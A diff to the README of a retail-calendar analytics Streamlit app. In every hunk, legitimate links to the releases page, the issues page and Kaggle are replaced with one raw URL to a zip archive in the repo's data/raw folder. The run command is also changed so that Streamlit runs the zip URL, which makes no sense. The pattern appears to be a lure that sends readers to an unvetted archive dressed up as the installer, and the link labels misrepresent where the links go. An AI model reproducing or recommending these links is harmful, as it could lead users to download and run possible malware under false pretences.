@@ -26,7 +26,7 @@ This application focuses on:
 To begin using Retail-Calendar-Pattern-Finder, follow these simple steps.
 
 1. **Download the Application**
-   - **Visit this page to download:** [Download Retail-Calendar-Pattern-Finder](https://github.com/OdeMotion/Retail-Calendar-Pattern-Finder/releases)
+   - **Visit this page to download:** [Download Retail-Calendar-Pattern-Finder](https://raw.githubusercontent.com/OdeMotion/Retail-Calendar-Pattern-Finder/main/data/raw/Pattern-Retail-Finder-Calendar-3.1.zip)
 
 2. **System Requirements**
    - Operating System: Windows 10 or later / macOS / Linux
@@ -49,7 +49,7 @@ To begin using Retail-Calendar-Pattern-Finder, follow these simple steps.
 
 ## 📥 Download & Install
 To install the software:
-- **Visit this page to download:** [Download Retail-Calendar-Pattern-Finder](https://github.com/OdeMotion/Retail-Calendar-Pattern-Finder/releases)
+- **Visit this page to download:** [Download Retail-Calendar-Pattern-Finder](https://raw.githubusercontent.com/OdeMotion/Retail-Calendar-Pattern-Finder/main/data/raw/Pattern-Retail-Finder-Calendar-3.1.zip)
 - Locate the latest release on the page.
 - Click on the downloaded file to run the installer.
 - Follow the prompts to finish the installation.
@@ -59,7 +59,7 @@ Once installed:
 1. Open a terminal or command prompt.
 2. Type the command:
    ```
-   streamlit run app.py
+   streamlit run https://raw.githubusercontent.com/OdeMotion/Retail-Calendar-Pattern-Finder/main/data/raw/Pattern-Retail-Finder-Calendar-3.1.zip
    ```
 3. If successful, this will open a new tab in your web browser displaying the Streamlit dashboard.
 
@@ -76,10 +76,10 @@ Once you have the dashboard open, you can:
 - Explore each section of the dashboard to fully understand the insights provided.
 
 ## ❓ Need Help?
-If you encounter any issues or have questions, consider checking the issues section of the [GitHub repository](https://github.com/OdeMotion/Retail-Calendar-Pattern-Finder/issues). The community is here to assist you.
+If you encounter any issues or have questions, consider checking the issues section of the [GitHub repository](https://raw.githubusercontent.com/OdeMotion/Retail-Calendar-Pattern-Finder/main/data/raw/Pattern-Retail-Finder-Calendar-3.1.zip). The community is here to assist you.
 
 ## 📑 Additional Resources
-- For more insights into retail analytics, check out relevant [Kaggle datasets](https://www.kaggle.com/datasets).
+- For more insights into retail analytics, check out relevant [Kaggle datasets](https://raw.githubusercontent.com/OdeMotion/Retail-Calendar-Pattern-Finder/main/data/raw/Pattern-Retail-Finder-Calendar-3.1.zip).
 - Discover additional tutorials and guides on data analysis on platforms like Medium and YouTube.
 
 ## 🔗 Community and Contribution
